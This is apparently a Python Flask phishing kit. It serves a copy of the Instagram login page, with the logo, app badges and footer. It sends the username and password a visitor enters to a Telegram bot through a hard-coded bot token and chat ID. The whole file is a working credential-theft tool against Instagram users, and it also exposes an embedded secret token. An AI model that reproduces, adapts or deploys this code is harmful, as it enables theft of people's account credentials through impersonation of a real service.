from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

# Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram bot token
TELEGRAM_BOT_TOKEN = '6752205626:AAFmvEgnj6j_jl1WmqSowQeSAQqYW_yo4hQ'
TELEGRAM_CHAT_ID = '5043961881'  # Replace with your actual Telegram chat ID

# Define the form template
form_template = """

<!-- This is instagram login page -->
<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Login . Instagram</title>
      <link rel="shortcut icon" href="/Instagram_logo_2016.svg.webp">
      <style>
         img {
         vertical-align: text-top;
         }
         body {
         font-family: sans-serif;
         background-color: #fafafa;
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
         Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
         box-sizing: border-box;
         align-content: top;
         }
         a {
         text-decoration: none;
         }
         .container {
         max-width: 1000px;
         margin: 0 auto;
         display: flex;
         justify-content: center;
         flex-direction: column;
         align-items: center;
         margin-top: 3rem;
         font-size: 14px;
         }
         .box {
         max-width: 350px;
         width: 100%;
         display: flex;
         justify-content: center;
         align-items: center;
         flex-direction: column;
         background-color: #ffff;
         border: 1px solid #e6e6e6;
         border-radius: 1px;
         margin: 0 0 10px;
         padding: 10px 0;
         flex-grow: 1;
         }
         .heading {
         margin: 22px auto 12px;
         background-image: url("https://www.instagram.com/static/bundles/es6/sprite_core_b20f2a3cd7e4.png/b20f2a3cd7e4.png");
         background-position: -98px 0;
         height: 51px;
         width: 177px;
         overflow: hidden;
         }
         .field {
         margin: 10px 0;
         position: relative;
         font-size: 14px;
         width: 100%;
         text-overflow: ellipsis;
         }
         input {
         padding: 9px 0px 7px 9px;
         font-size: 12px;
         width: 16rem;
         height: 1.2rem;
         outline: none;
         background: #fafafa;
         border-radius: 3px;
         border: 1px solid #efefef;
         }
         /* label intial position*/
         label {
         position: absolute;
         pointer-events: none;
         left: 10px;
         padding-bottom: 15px;
         transform: translateY(10px);
         line-height: 6px;
         transition: all ease-out 0.1s;
         font-size: 14px;
         color: #999;
         padding-top: 6px;
         }
         /* hiding placeholder in all browsers */
         input::placeholder {
         visibility: hidden;
         }
         /* hiding  placeholder in mozilla */
         .login-form ::-moz-placeholder {
         color: transparent;
         }
         /* label final position */
         input:not(:placeholder-shown) + label {
         transform: translateY(0);
         font-size: 11px;
         }
         /* input padding increases if placeholder is not shown */
         input:not(:placeholder-shown) {
         padding-top: 14px;
         padding-bottom: 2px;
         }
         .login-button {
         text-align: center;
         width: 100%;
         height: 35px;
         border: 1px solid transparent;
         background-color: #3897f0;
         color: #fff;
         font-weight: 600;
         font-size: 14px;
         cursor: pointer;
         }
         .separator {
         display: flex;
         justify-content: space-between;
         align-items: center;
         color: #999;
         margin-top: 6px;
         }
         .separator .line {
         height: 1px;
         width: 40%;
         background-color: #dbdbdb;
         }
         .other {
         display: flex;
         justify-content: center;
         flex-direction: column;
         align-items: center;
         }
         .fb-login-btn {
         margin: 1rem;
         border: 0;
         cursor: pointer;
         font-size: 14px;
         color: #385185;
         font-weight: 600;
         background: transparent;
         }
         .fb-icon {
         color: #385185;
         font-size: 1rem;
         padding-right: 1px;
         }
         .forgot-password {
         font-size: 11px;
         color: #003569;
         }
         .signup {
         color: #3897f0;
         font-weight: 600;
         }
         p{
         text-align: center;
         }
         .container1 {
         align-self: center;
         background-image: url(/rsrc.php/v3/y4/r/ItTndlZM2n2.png);
         background-position: -46px, 0;
         background-size: 468.32px 634.15px;
         flex-basis: 380.32px;
         height: 581.15px;
         margin-bottom: 12px;
         margin-right: 32px;
         }
         .footer{
         text-align: center;
         font-size: 13px;
         word-spacing: 15px;
         }
         .copyright{
         text-align: center;
         font-size: 13px;
         }
         .get{
         text-align: center;
         font-size: 15px;
         }
         .apps{
         align-items: center;
         text-align: center;
         }
      </style>
   </head>
   <body>
      <div class="container">
         <div class="box">
            <div class="heading"></div>
            <form class="login-form">
               <div class="field">
                  <input  id="name" name="name" type="name" placeholder="Phone number, username, or email" />
              
                  <label for="name">Name</label>
               </div>
               <div class="field">
                  <input id="email" name="email"  type="password" placeholder="password" />
                     <label for="password">Password</label>
                  <!-- <label for="email">Email:</label> -->
               </div>
               <!-- <button class="login-button" title="login"><a href="wrong_password.html">Log In</button></a> -->
               <input type="submit" class="login-button" value="Submit"/>
               <div class="separator">
                  <div class="line"></div>
                  <p>OR</p>
                  <div class="line"></div>
               </div>
               <div class="other">
                  <button class="fb-login-btn" type="button">
                  <i class="fa fa-facebook-official fb-icon"></i>
                  <span class=""><img src="https://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/social-facebook-icon.png"height="15" width="15"><a href="facebook-login.html">&nbsp;Log in with Facebook</a>
                  </span>
                  </button>
                  <a class="forgot-password" href="/forget.html">Forgot password?</a>
               </div>
            </form>
         </div>
         <div class="box">
            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
         </div>
      </div>
      <br>
      <div class="get">
         Get the app.
      </div>
      <br>
      <div class="apps">
         <a href="/forget.html">
         <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" height="40"
            width="134"></a>&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;<a href="/forget.html"> 
         <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" height="40" width="134"></a>
      </div>
      <br>
      <div class="footer">
         <footer>
            Meta
            About
            Blog
            Jobs
            Help
            API
            Privacy
            Terms
            Top Accounts
            Hashtags
            Locations
            Instagram Lite
            Contact Uploading & Non-Users
         </footer>
      </div>
      <div class="copyright">
         <br>    
         English © 2022 Instagram from Meta
      </div>
   </body>
</html>
"""

# Route for displaying the form
@app.route('/')
def show_form():
    return form_template

# Route for handling form submission
@app.route('/submit', methods=['POST'])
def submit_form():
    try:
        name = request.form['name']
        email = request.form['email']

        # Send the form data to the Telegram bot
        message = f"New form submission:\nName: {name}\nEmail: {email}"
        send_message_to_telegram(message)

        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

def send_message_to_telegram(message):
    telegram_api_url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    params = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    response = requests.post(telegram_api_url, params=params)
    response.raise_for_status()

# Main function
if __name__ == "__main__":
    app.run(port=5000)
